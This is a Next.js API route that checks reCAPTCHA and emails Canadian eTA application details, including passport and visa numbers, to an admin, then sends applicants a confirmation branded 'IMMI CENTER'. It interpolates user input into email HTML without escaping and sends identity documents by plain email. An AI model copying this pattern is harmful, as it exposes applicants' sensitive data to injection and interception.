import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

// Initialize Resend with API key (fallback to empty string for build time)
const getResend = () => {
  const apiKey = process.env.RESEND_API_KEY || '';
  return new Resend(apiKey);
};

export async function POST(req: NextRequest) {
  try {
    const data = await req.json();
    const recaptchaToken = data.recaptchaToken as string;

    if (!recaptchaToken) {
      return NextResponse.json({ error: 'reCAPTCHA verification required' }, { status: 400 });
    }

    if (!process.env.RECAPTCHA_SECRET_KEY) {
      return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
    }

    const recaptchaResponse = await fetch('https://www.google.com/recaptcha/api/siteverify', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `secret=${process.env.RECAPTCHA_SECRET_KEY}&response=${recaptchaToken}`,
    });

    const recaptchaData = await recaptchaResponse.json();

    if (!recaptchaData.success || recaptchaData.score < 0.5) {
      return NextResponse.json({
        error: 'reCAPTCHA verification failed. Please try again.'
      }, { status: 400 });
    }

    let emailHtml = `
      <h2>New eTA Application Submission</h2>
      <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
      <p><strong>reCAPTCHA Score:</strong> ${recaptchaData.score} (${recaptchaData.score >= 0.7 ? 'High confidence' : 'Medium confidence'})</p>
      <hr>
      <h3>Passport Details</h3>
    `;

    // Helper function with a specific type instead of 'any'
    const addField = (label: string, value: string | number | boolean | null | undefined) => {
      if (value !== undefined && value !== null && value !== "") {
        emailHtml += `<p><strong>${label}:</strong> ${value}</p>`;
      }
    };

    // Page 1: Passport Details
    addField('Travel Document', data.travel_document);
    addField('Nationality', data.nationality);
    if (data.nationality === 'Taiwan (holders of passports containing a personal identification number)') {
      addField('Taiwan National Identification Number', data.taiwan_id);
    }
    if (data.us_visa_number) {
        addField('US Visa Number', data.us_visa_number);
        addField('US Visa Number (Confirm)', data.us_visa_number_confirm);
        const usVisaExpiry = `${data.us_visa_expiry_month || ''}/${data.us_visa_expiry_day || ''}/${data.us_visa_expiry_year || ''}`;
        addField('US Visa Expiry Date', usVisaExpiry);
    }
    addField('Passport Number', data.passport_number);
    addField('Passport Number (Confirm)', data.passport_number_confirm);
    addField('Surname(s) / Last Name(s)', data.surname);
    addField('Given Name(s) / First Name(s)', data.given_name);
    const dob = `${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}`;
    addField('Date of Birth', dob);
    addField('Gender', data.gender);
    addField('Country/Territory of Birth', data.birth_country);
    addField('City/Town of Birth', data.birth_city);
    const passportIssueDate = `${data.passport_issue_month || ''}/${data.passport_issue_day || ''}/${data.passport_issue_year || ''}`;
    addField('Date of Issue of Passport', passportIssueDate);
    const passportExpiryDate = `${data.passport_expiry_month || ''}/${data.passport_expiry_day || ''}/${data.passport_expiry_year || ''}`;
    addField('Date of Expiry of Passport', passportExpiryDate);

    // Page 2: Personal, Employment, and Address Details
    emailHtml += `<hr><h3>Personal & Employment Details</h3>`;
    addField('Are you a citizen of any additional nationalities?', data.additional_nationality);
    if (data.additional_nationality === 'Yes') {
      addField('Additional Nationalities', data.additional_nationality_details);
    }
    addField('Marital Status', data.marital_status);
    addField('Have you ever applied for a Canadian visa, eTA, or permit?', data.canada_visa_applied);
    if (data.canada_visa_applied === 'Yes') {
      addField('Previous UCI / Visa / eTA Number', data.previous_visa_number);
      addField('Previous UCI / Visa / eTA Number (Confirm)', data.previous_visa_number_confirm);
    }
    addField('Occupation', data.occupation);
    if (!['Unemployed', 'Homemaker', 'Retired'].includes(data.occupation)) {
        addField('Job Description', data.job_description);
        addField('Employer/School Name', data.employer_name);
        addField('Employment Country/Territory', data.employment_country);
        addField('Employment Start Date', data.employment_start_date);
    }

    emailHtml += `<hr><h3>Residential Address</h3>`;
    addField('Apartment Number', data.apartment_number);
    addField('Street Number', data.street_number);
    addField('Street Name', data.street_name);
    addField('City/Town', data.city_town);
    addField('District/Region', data.district_region);
    addField('Country/Territory', data.address_country);
    addField('Zipcode', data.zip_code);
    
    emailHtml += `<hr><h3>Contact Information</h3>`;
    addField('Email of Applicant', data.email);
    addField('Phone Number', data.phone);

    // Page 3: Travel and Consent
    emailHtml += `<hr><h3>Travel Information</h3>`;
    addField('Do you know when you will travel to Canada?', data.do_you_know_travel_date);
    if (data.do_you_know_travel_date === 'Yes') {
      const travelDate = `${data.travel_date_month || ''}/${data.travel_date_day || ''}/${data.travel_date_year || ''}`;
      addField('Planned Travel Date', travelDate);
    }
    addField('Consent and Declaration', data.consent_declaration ? 'Agreed' : 'Not Agreed');


    const resend = getResend();
    await resend.emails.send({
      from: 'eTA Application 2 <noreply@immicenter-online.com>',
      to: process.env.ADMIN_EMAIL || 'admin@yourdomain.com',
      subject: `New eTA Application - ${data.given_name || ''} ${data.surname || ''}`,
      html: emailHtml,
    });

    if (data.email) {
      await resend.emails.send({
        from: 'IMMI CENTER <noreply@immicenter-online.com>',
        to: data.email,
        subject: 'We have received your response for CANADA ETA PERMIT AUTHORIZATION',
        html: `
<table width="100%" cellpadding="0" cellspacing="0" style="background:#f4f4f7;padding:0;margin:0;">
  <tr>
    <td align="center">
      <table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.04);margin:40px 0;">
        <tr>
          <td style="padding:40px 32px 32px 32px;text-align:center;">
            <h1 style="color:#34A853;font-size:24px;margin-bottom:16px;">We have received your response for CANADA ETA PERMIT AUTHORIZATION</h1>
            <p style="font-size:16px;color:#222;margin-bottom:16px;">Hello!</p>
            <p style="font-size:16px;color:#222;margin-bottom:16px;">We have received your request for the issuance of the Electronic Travel Authorization (eTA) for Canada.</p>
            <p style="font-size:16px;color:#222;margin-bottom:16px;">Your application will be processed shortly.<br/>
              <span style="font-weight:600;">Processing time may take a few minutes or up to 72 hours.</span>
            </p>
            <p style="font-size:20px;color:#222;font-weight:700;margin-bottom:8px;">IMPORTANT INFORMATION:</p>
            <p style="font-size:16px;color:#222;margin-bottom:16px;">
              We suggest keeping an eye on your email inbox as <span style="font-weight:bold;">well as your SPAM folder</span>, as mentioned during the application process, for future communications and updates regarding your application.
            </p>
            <p style="font-size:16px;color:#222;margin-bottom:16px;">Best regards,<br/>Applicant Support – eTA Canada Support</p>
            <p style="font-size:13px;color:#888;margin-top:32px;">&copy; IMMI CENTER</p>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
        `,
      });
    }

    return NextResponse.json({ success: true, message: 'Application submitted successfully' });

  } catch {
    return NextResponse.json({ error: 'Failed to submit application' }, { status: 500 });
  }
}
